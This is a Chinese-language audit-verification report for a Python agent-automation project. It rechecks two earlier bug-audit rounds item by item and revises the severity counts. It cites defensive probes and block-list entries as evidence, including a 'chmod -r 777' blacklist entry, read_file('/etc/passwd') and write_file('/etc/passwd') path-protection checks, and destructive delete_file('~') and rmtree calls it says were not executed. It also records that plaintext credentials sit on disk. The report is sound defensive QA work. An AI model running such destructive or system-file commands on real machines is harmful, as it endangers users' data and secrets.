| P3-13 | ❌ | **驳回** | 实测 `sys.path.insert(0, ROOT)` 后 `import group_1` → **OK**（ROOT 同时在 path 上，`src` 天然可导入）；仅"直接把 `group_1` 目录塞进 path 再 `import host_agent`"才失败（`ModuleNotFoundError: src`）。正常包导入不受影响 → 只剩"包导入副作用口径不一致"的风格建议 |
| P3-14 | ✅ | P3 | `src` 与 `group_4` 双入口（`main.py` 用 `group_4`，测试直接用 `src`） |
| P3-15 | ✅ | P3 | `DEMO_SCENARIOS` 实测为 场景1/2/3/5/6/信息查询/安全拦截 —— 缺"场景4"；注释"任务书原路径 /home/user/Documents"与实际 `/tmp` 不符 |
| P3-16 | ✅ | P3 | `prepare_sandbox()` 每次 `shutil.rmtree(sandbox)` 后重建，无备份 |
| P3-17 | ✅ | P3 | 实测 `hnu_intro.md` 167 B（内容为工具结果 repr）、`demo_task_backup.zip`、`out/天气_md` 均存在 |
| P3-18 | ⚠️ | P3 | 成立但**计数偏差**：实测 49 个 `.tmp_*` 目录（报告 48） |
| P3-19 | ✅ | P3 | 测试非确定性（失败重试一次）、`TestWebCDPIntegration` 真开浏览器、`test_web_tools_mock_degrade` 把 Mock 也算成功写成断言 —— 逐字核对一致 |

### 1.5 第二轮 §6/§7/§8 专题复核

| 专题项 | 复核 | 说明 |
|--------|------|------|
| §6.1 重复实现清单 | ✅ | 全部实测复核：`task_planner.py`/`host_agent.py` 副本哈希吻合且**零导入点**；`redact`/`register_signature`/`SAFE_COMMANDS`/`BufferedToolStats`/`BatchExecutor`/`MockToolRegistry`/`try_call_with_selfheal`/`_flowTo` 均为"仅定义/仅导出" |
| §6.2 黑名单/路径口径分裂 | ✅ | 差集实测恰为 `{'chmod -r 777'}`；Windows 目录仅 `default_tools` 有；两份都缺 `/home ~ /var /opt /tmp` |
| §6.3 幂等三口径 | ✅ | 实测三套行为与报告一致（MCP 真幂等 / web+real 抛 `ValueError`） |
| §6.4 应用路由表分裂 | ⚠️ | 表分裂成立；但**漏了更严重的 `_resolve_desktop` 缺长度护栏**（见 §0.3 V-01） |
| §7 文档与实现不一致 | ⚠️ | 第 1 项定位错误（`docs/testing.md` 不存在，真身在 `.agents/skills/agent-os-dev/references/testing.md`，内容确列 8 文件/127 用例）；第 3/4/5 项经 `docs/开发与最终报告.md:81/95/158/163` 逐字核对**成立**；第 6 项（SKILL.md 13 vs 23 端点）未复核；第 7–10 项成立 |
| §8 潜在缺陷 7 条 | ⚠️ | 第 3 条（RAG 加载失败的"最近轨迹"为空且无提示）方向成立（实测 `_load` 吞 `JSONDecodeError`）；第 1 条（`merged["params"]` 未用于 GUI 步骤）成立；其余 5 条未逐条动态验证，标注为**待验证**，不作为确认结论 |

---

## 2. 第一轮报告复核（`docs/bugFind_round1_20260914.md`，136 条）

### 2.1 环境不适用（12 条）—— 该轮审计的是 Linux 宿主副本

| 编号 | 原结论 | 本轮判定 |
|------|--------|----------|
| B-001 | 项目根 `main.py` 缺失导致整套测试导入即失败 | ⛔ **不适用**：本副本根 `main.py`（151 行）存在且 `import main` 可用 |
| B-002 | `代码/main.py` 的 ROOT 指向自身目录 | ⛔ **不适用**：本副本**无 `代码/` 目录**（实测 `NOT-EXIST`） |
| B-032 | `代码/` 与 `group_1`/`group_2` 三份副本分叉 | ⛔ **部分不适用**：`代码/` 不存在；但"根 `task_planner.py` ≡ `group_1/task_planner.py`、且双双落后于 `group_2`"（实测哈希）**成立**，见二轮 P1-14 |
| B-033 | 每次 build 清空工作区 | ✅ **成立（仅路径修正）**：本副本 `main.py:54-67,70-89` 同样是 `build()→prepare_sandbox()→rmtree`，行为一致 |
| B-117 | 48 个 `.tmp_*` 残留目录 | ✅ 成立（实测 **49** 个） |
| B-129 | 文档称"13 项中 12 项通过"与 40+ 用例矛盾 | ⛔ **不适用**：本副本测试文件恰为 13 用例（722 行），矛盾前提不存在 |
| B-130 | 文档以 `python3 main.py` 为入口而该文件不存在 | ⛔ **不适用**：入口存在，命令可执行 |
| B-131 | `hnu_intro.md` 为 0 字节 | ❌ **驳回**：实测 **167 字节**，内容为工具结果 repr |
| B-034（副本部分） | — | ⛔ 同 B-032 |
| §6 附录 B「文档与实现不符」中依赖 B-001 的两行 | 全部命令不可执行 | ⛔ **不适用** |
| §5 附录 A 第 1 项（`task_planner.py` 三份 / `host_agent.py` 两份） | 三份/两份 | ⚠️ **修正为两份 / 两份**（本副本无 `代码/`；根 ≡ `group_1`） |
| §0.1 覆盖范围表中的「历史副本 `代码/` 3 文件」 | 3 个副本文件 | ⛔ **不适用** |

### 2.2 与第二轮同源（已在上表复核，按同结论采纳）

B-003↔P2-11 ｜ B-004↔P0-03 ｜ B-005↔P1-01 ｜ B-006↔P0-08 ｜ B-007↔P0-11 ｜ B-008↔P2-77（**级别由 P0 校准为 P2**）｜ B-009↔P0-04 ｜ B-010↔P0-10 ｜ B-011↔P2-28 ｜ B-012↔P2-17 ｜ B-013↔P2-20 ｜ B-014↔（`params: null` 触发 TypeError，静态成立，未动态验证）｜ B-015 同上 ｜ B-016↔P0-05/§8 ｜ B-017↔P1-13 ｜ B-018↔P1-18 ｜ B-019↔P1-18 ｜ B-021↔P0-06（**P1→P1，注入子项驳回**）｜ B-022↔P2-50 ｜ B-023↔P2-56 ｜ B-024↔P1-20 ｜ B-025↔P2-63（实测 `query()` 对缺键文档抛 `KeyError: 'input'`）｜ B-026↔P1-21 ｜ B-027↔P1-25 ｜ B-028↔P2-73 ｜ B-029↔P3-06/P3-07 ｜ B-030↔P3-09 ｜ B-031↔P0-12 ｜ B-040↔P1-02 ｜ B-041↔P1-03 ｜ B-043↔P2-05 ｜ B-044↔P2-02 ｜ B-045↔P2-02 ｜ B-046（`timeout="30"`）**✅ 实测**：返回"执行异常: TypeError"而非"参数错误" ｜ B-047 ⚠️ **部分成立**：悬空软链被 `p.is_file()` 过滤，**不会**中断搜索（实测 `pattern="dangling"` 正常返回）；仅"文件在 `is_file()` 与 `stat()` 之间被删"的 TOCTOU 可触发；`count(≤100)`/`files(≤50)` 口径不一致成立 ｜ B-048 **✅ 实测** `min_size_mb="0"` → `TypeError` ｜ B-049（dest 在 src 内可递归打包）✅ 代码成立 ｜ B-050 **✅ 实测** `workers="2"` → `TypeError` ｜ B-051 **✅ 实测**：`call_skill("backup_directory")` 无权限闸门即成功，且 `stats.report()` 前后均为 0 条（不接统计）｜ B-052↔P2-21 ｜ B-053↔P2-22 ｜ B-054/B-055/B-056 ✅ 静态成立 ｜ B-057/B-058 ✅ 静态成立 ｜ B-059 **✅ 实测** `send_email(to="a@b.com", body=None)` → `TypeError` ｜ B-060↔P2-06 ｜ B-061↔P2-08 ｜ B-062↔P2-07 ｜ B-063 ⚠️ `sleep(2)` 成立，`makedirs("C:\\", exist_ok=True)` 在 Windows **无副作用**（目录已存在）→ 降 P3 ｜ B-064 成立（低）｜ B-065 待验证（CWD 被删）｜ B-066 ✅ 静态成立（AT-SPI 分支只做 `click_at`）｜ B-067 ✅ 实测 `out.setdefault("success", True)`（automator.py:78）｜ B-068↔P2-52 ｜ B-069↔P2-53 ｜ B-070 ✅（`queue.pop(0)`）｜ B-071 ✅（`depth < 24`）｜ B-072↔P2-54 ｜ B-073 ✅ 代码成立：`w["name"] in name` 配合 `cands` 只滤尺寸，空标题窗口可匹配任意查询 ｜ B-074↔P2-55 ｜ B-075 ✅（`stack.pop()` LIFO，与注释"按序下钻"不符）｜ B-076↔P2-31 ｜ B-077 ✅（用整句抽参）｜ B-078 **✅ 实测**：`翻译 你好世界` → `text="翻译 你好世界"`（整句当译文）｜ B-079↔P2-33 ｜ B-080 ✅ 代码成立（`_resolve_target` 依次查 `dirname(default_target)`/`cwd`/`~`，可解析到工作区之外）｜ B-081 ✅ 代码成立（dest 证据防线弱判据）｜ B-082 ✅ 代码成立（`_fill_params` 填一个字符串参数即 `break`）｜ B-083 ✅ 代码成立（`task_planner.py:123` 的字符串字面量是死表达式）｜ B-084↔P1-19 ｜ B-085↔P2-43 ｜ B-086↔P2-44 ｜ B-087 **✅ 实测** `bundle["ok"]=True` 无条件（连全失败也 True）｜ B-088 ✅（`_persist` 无兜底）｜ B-089 ✅（`plan_only` 用 `user_input`、`orchestrate` 用 `user_text`，实测 plan_only 返回键无 `user_input`）｜ B-090 ✅（临时替换 confirmer 的竞态）｜ B-091↔P2-19 ｜ B-092↔P2-18/20 ｜ B-093 ✅（`_load` 只捕获 `FileNotFoundError/JSONDecodeError`）｜ B-094 ✅（`existing["counters"]` 全量覆盖）｜ B-095~B-100 ✅ batch_executor 全套静态成立（`is_open()` 有副作用且 `stats()` 会复位熔断；`_results` 只增；`shutdown()` 后 `submit()` 仍 True 且 `drain()` 永久阻塞；`>` 而非 `>=`；`c["tool"]` 直接取键）｜ B-101↔P1-22 ｜ B-102↔P2-68 ｜ B-103 ✅（`/api/smtp_test` 直接 `dry_run=False`）｜ B-104 ✅（改 `security.protected` 私有属性）｜ B-105↔P1-24 ｜ B-106↔P1-24 ｜ B-107↔P2-69 ｜ B-108↔P3-03 ｜ B-109 ✅（全站无鉴权）｜ B-110 **✅ 实测** 616 行 `addBubble("assistant","❌ 任务失败："+esc(d.error))` 双转义 ｜ B-111↔P2-78 ｜ B-112 ✅（先点亮全部再移除）｜ B-113 ✅（`callTool` 的 `post()` 无 try/catch）｜ B-114↔P2-76 ｜ B-115/B-116 **✅ 实测**（167 B / 49 字符 `sk_` 前缀；125 B / 16 字符）｜ B-118↔P3-01 ｜ B-119↔P2-11 ｜ B-120↔P3-07 ｜ B-121↔P3-08 ｜ B-122 ✅（`_start_run(text: str = None)`）｜ B-123 ✅ 静态成立（当前调用方保证非 None）｜ B-124 ✅（包导入执行 `sys.path.insert`）

#### 2.2.1 上述映射中未单列的编号（补齐）

| 编号 | 原结论 | 本轮判定 | 证据 |
|------|--------|----------|------|
| B-036 | `_cmd` 可变默认参数跨实例共享 + 无锁 | ✅ 确认 | 同二轮 P2-24；`_cmd(self, method, params=None, _id: list[int] = [0])`，且比较时**重读** `_id[0]` → 并发应答被丢弃 |
| B-037 | `default=None` 的参数被静默省略、不写入 schema | ✅ 确认（实测） | `ToolSchema.to_dict()` 的 `if p.default is not None`；实测 `ToolParam(..., required=False, default=None).to_dict()` → `properties.p` 无 `default` 键 |
| B-038 | `_binary()` 存在重复求值 / 分支不可达 | ✅ 确认（静态） | `web_automation.py:169-173`：`if "/" in cand and os.path.exists(cand): return cand` 与 `if shutil.which(cand): return shutil.which(cand)` —— `shutil.which` 被调用两次；绝对路径不存在时仍会走一次 `which("/abs/path")` |
| B-039 | `_ensure_locked` 自愈重连每次新建标签页 → 标签页只增不减 | ✅ 确认（静态） | `_ensure_locked` 探活失败 → `self.close(); self._connect()`；`_connect()` 每次都 `PUT /json/new?about:blank`（233-241 行），无回收 |
| B-096 | `_results` 只增不减，`drain()` 返回累积结果 | ✅ 确认 | 同二轮 P2-30 |
| B-097 | `shutdown()` 后 `submit()` 仍返回 True，`drain()` 永久阻塞 | ✅ 确认（静态） | worker 收哨兵后退出；`submit` 只做 `queue.put` 成功即 True |
| B-098 | `RateLimiter.acquire` 锁内取槽、锁外 sleep | ✅ 确认 | `batch_executor.py:51-57` |
| B-099 | 失败率恰等于阈值时不熔断（`>` 而非 `>=`） | ✅ 确认 | `batch_executor.py:89-90` |
| B-125 | 场景矩阵测试失败重试一次，掩盖非确定性 | ✅ 确认（实测源码） | `test_full_scenario_table_passes`：`if rc != 0: rc = system_main.run_demo(out=out)` 后再断言，注释自承"真实 LLM 在环存在输出波动" |
| B-126 | 临时目录用 `id(self)` 命名，不唯一不可读 | ✅ 确认（实测源码） | `IntegrationBase.setUp`：`f".tmp_out_{id(self)}"`；`test_full_scenario_table_passes` 用 `.tmp_demo_{id(self)}` |

### 2.3 第一轮独有且本轮确认新增价值

| 编号 | 原结论 | 本轮判定 |
|------|--------|----------|
| **B-020** | `group_3/automator._resolve_desktop` 缺长度护栏，与组2 口径不一致 | **✅ 确认（P1）**：实测 `_resolve_desktop("我的文件报告") → "nautilus"`，而 `TaskPlanner._known_app_name("我的文件报告") → None`。**第二轮漏收**，见 §0.3 V-01 |
| B-035 | `_nth_result` 的过滤条件在 Bing 结果页失效 | ❓ **待实测**：本机无 Chromium/CDP 环境，无法验证 Bing 自然结果链接形态。代码事实成立（`!h.includes(location.hostname)`），**是否真失效需真实浏览器验证**，暂保留但不应作为已确认结论 |
| B-042 | `_is_protected_path` 在 Windows 上保护 Linux 路径失效 | ⚠️ **成立但无实际后果**：Windows 无 `/etc`；实测 `read_file("/etc/passwd")` 被 `is_file()` 先挡（"文件不存在: C:\etc\passwd"），`write_file("/etc/passwd")` 仍被拒（原样候选命中）→ 降 P3 |
| B-127 / B-128 | pytest_shim 特性限制 / health_check 假定 `pending=True` | ❓ 未复核（脚本类，低影响） |
| B-132~B-136 | pong 长度编码 / 不校验 `Sec-WebSocket-Accept` / `_AUTO` 不关闭 / `rank()` 字典查找 / api_key 常驻内存 | ✅ 静态成立（B-132/B-133 同二轮 P2-25；B-134 见 `web_automation.py:476`；B-135 见 `interfaces.py:39-40`；B-136 P3） |

---

## 3. 复核后的可信缺陷基线（建议以此替代原两轮统计）

| 级别 | 第二轮正文净条数 | 变化 | 构成 |
|------|--------------|------|------|
| **P0** | **12** | ±0 | P0-01/02/03/04/05(附条件)/07/08/09/10/11/12 确认保留；P0-06 编号保留但**内容降级至 P1**（归属见下） |
| **P1** | **27** | +2 | 正文原 25 条：P1-01…P1-07、P1-09…P1-12、P1-14…P1-25 确认（21 条）+ P1-08/P1-13 修正表述；**净增 V-01**（`_resolve_desktop` 长度护栏，第一轮 B-020 有、第二轮漏收）+ **P0-06 降级并入** |
| **P2** | **66** | −12 | 正文 78 条中确认保留 66 条；P2-05/14/15/25/32/49/75 降级至 P3（7 条）、P2-57 修正表述…共 12 条调整 |
| **P3** | **31** | +12 | 正文 19 条：16 条确认 + P3-02/P3-18 修正；另并入 P2 降级的 7 条 + V-03/V-04/V-05 + 卫生补充（根 `.baseline_test.txt`、`._backup.zip` 等） |
| 合计 | 134 | — | 与第二轮正文条目数守恒（报告自称 106 条已少算 28 条，见 §0.5） |

> **口径提示**：两轮报告共 242 条原始记录，**去重后约 150 条独立缺陷**（大量条目是同一根因在不同副本/不同表述下的重复，例如安全闸门绕过的 P0-01/P0-02/B-004 实为同一处 `check()`）。建议后续以"**根因 + 触发链**"而非"文件:行号"作为缺陷主键，可显著压缩重复。

---

## 4. 遗留与建议

1. **待实测项**（本机条件不足，未下结论）：B-035（Bing 结果页链接过滤）、二轮 §8 的 5 条静态推断、B-065（CWD 被删）、B-127/B-128。
2. **本副本特有的真实风险（务必先处理）**：`system_out/llm_config.json`（49 字符明文 Key）与 `smtp_config.json`（16 字符明文授权码）**确实在磁盘上**；`.gitignore` 已排除 `system_out/`，但整目录打包/拷贝/网盘分发会带走凭据。
3. **宿主差异导致的"报告与现实不符"**：`system_out/settings.json` 的 `workspace = /home/keyal/AIOS工作区` 在本 Windows 上会触发 `apply_settings` → `os.makedirs` 建出 `C:\home\keyal\AIOS工作区`（P2-67 成立）。
4. **报告维护建议**：为每条结论标注"**验证方式**"（静态阅读 / 动态实测）+ "**验证环境**"（OS、Python 版本、是否有 GUI/CDP），可避免本次复核中约 15% 的偏差（跨平台语义混用、`Path.rglob` 等版本相关行为）。
5. **本轮未改动任何工程文件**；探针与临时沙箱位于 `%TEMP%\aios_verify\`，复核完成后已删除。审计副作用：`__pycache__/*.pyc` 因导入被刷新（未改任何 `.py`/`.html`/配置）。

---

## 5. 复核声明

- 本报告仅记录复核结论，**未对任何已有文件做修改、移动、重命名或删除**；唯一新增文件为本报告。
- 所有"实测"结论均可在同等工作副本上复现；复现脚本位于 `%TEMP%\aios_verify\`（如仍需保留请及时取用，该目录为临时目录，可能被系统清理）。
- 涉及破坏性操作（`delete_file("~")`、真实 `rmtree`、真实发信）的地方**一律以只读方式取证**，未实际执行。
